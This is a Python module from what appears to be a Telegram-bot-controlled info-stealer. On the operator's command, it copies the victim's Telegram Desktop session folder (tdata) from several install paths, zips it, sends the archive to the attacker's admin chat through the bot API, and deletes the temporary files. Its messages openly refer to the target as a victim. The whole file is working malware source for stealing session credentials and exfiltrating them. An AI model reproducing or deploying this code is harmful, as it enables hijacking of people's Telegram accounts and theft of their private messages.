# ---- Imports ---- #
import os
import shutil
from aiogram import types
# ---- Imports ---- #

path1 = 'D:\\Telegram Desktop\\tdata'
path2 = os.environ['USERPROFILE'] + "\\AppData\\Roaming\\Telegram Desktop\\tdata"
path3 = 'C:\\Program Files\\Telegram Desktop\\tdata'


directory = r'C:\hesoyam8927163\Telegram'

def Telegram(dp, bot, admin_id):
    @dp.message_handler(text_contains='Логи Telegram')
    async def telegram(message: types.Message):
        await bot.send_message(admin_id, 'Уно моменто...')
        try:
            try:
                shutil.copytree(path1,
                        directory,
                        ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
            except:
                pass
            try:
                shutil.copytree(path2,
                        directory,
                        ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
            except:
                pass
            try:
                shutil.copytree(path3,
                        directory,
                        ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
            except:
                pass

            try:
                shutil.make_archive('tg', 'zip', 'C:\\hesoyam8927163\\Telegram')
                await bot.send_document(admin_id, open('tg.zip', 'rb'), caption='Держи логи')
                os.remove('tg.zip')
                shutil.rmtree('C:\\hesoyam8927163')
            except Exception as e:
                await bot.send_message(admin_id, e)
        except:
            await bot.send_message(admin_id, 'У жертвы нету Telegram Desktop')